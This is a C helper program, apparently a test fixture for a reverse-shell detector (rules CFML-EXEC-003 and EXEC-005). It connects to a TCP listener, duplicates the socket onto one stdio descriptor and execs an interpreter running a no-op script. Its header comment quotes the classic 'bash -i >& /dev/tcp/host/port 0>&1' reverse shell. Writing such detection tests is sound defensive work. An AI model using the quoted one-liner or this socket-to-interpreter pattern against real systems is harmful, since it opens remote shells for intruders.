/*
 * interp-stdio-helper — set up exactly one stdio fd on a remote TCP
 * socket and exec an interpreter.
 *
 * Threat scenario: the "weak reverse shell" variant. The classic
 * `bash -i >& /dev/tcp/host/port 0>&1` dup's all three stdio fds onto
 * the same remote socket — CFML-EXEC-003 catches that strict pattern.
 * Sophisticated attackers split the fds (stdin from socket, stdout
 * to local pipe to obscure activity, or vice versa) and trip only
 * the weak-signal CFML-EXEC-005 detector.
 *
 * Usage: interp-stdio-helper FD INTERP HOST PORT
 *   FD: which of 0/1/2 to dup the remote socket onto (only one)
 *   INTERP: absolute path to interpreter to exec (e.g. /usr/bin/python3)
 *   HOST PORT: where the local listener is (typically 127.0.0.1 4444)
 *
 * The helper connects TCP to HOST:PORT, dup3()s the socket onto FD,
 * leaves the other two stdio fds alone, then execv's INTERP with
 * a short script that exits after one read so the listener doesn't
 * block the harness.
 */

#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

int main(int argc, char **argv)
{
    if (argc != 5) {
        fprintf(stderr, "usage: %s FD INTERP HOST PORT\n", argv[0]);
        return 2;
    }
    int target_fd = atoi(argv[1]);
    const char *interp = argv[2];
    const char *host = argv[3];
    int port = atoi(argv[4]);

    if (target_fd < 0 || target_fd > 2) {
        fprintf(stderr, "FD must be 0, 1, or 2\n");
        return 2;
    }

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) { perror("socket"); return 1; }

    struct sockaddr_in sa = {};
    sa.sin_family = AF_INET;
    sa.sin_port   = htons((uint16_t)port);
    if (inet_pton(AF_INET, host, &sa.sin_addr) != 1) {
        fprintf(stderr, "bad HOST: %s\n", host);
        return 2;
    }
    if (connect(sock, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        perror("connect");
        return 1;
    }

    /* dup3 the remote socket onto the chosen stdio fd. Leave the
     * other two alone — that's the EXEC-005 "1 of 3 remote" pattern. */
    if (dup3(sock, target_fd, 0) < 0) {
        perror("dup3");
        return 1;
    }
    if (sock != target_fd) close(sock);

    /* Tiny no-op script so the interpreter exits promptly. We just
     * need the execve to happen with the right fd shape — what the
     * script actually does is irrelevant. */
    char *interp_argv[] = {
        (char *)interp,
        (char *)"-c",
        (char *)"import os; os._exit(0)",
        NULL,
    };
    /* Bash doesn't grok -c "import os; os._exit(0)" so adapt for it. */
    if (strstr(interp, "bash") || strstr(interp, "sh")) {
        interp_argv[1] = (char *)"-c";
        interp_argv[2] = (char *)"exit 0";
    }

    execv(interp, interp_argv);
    perror("execv interpreter");
    return 1;
}
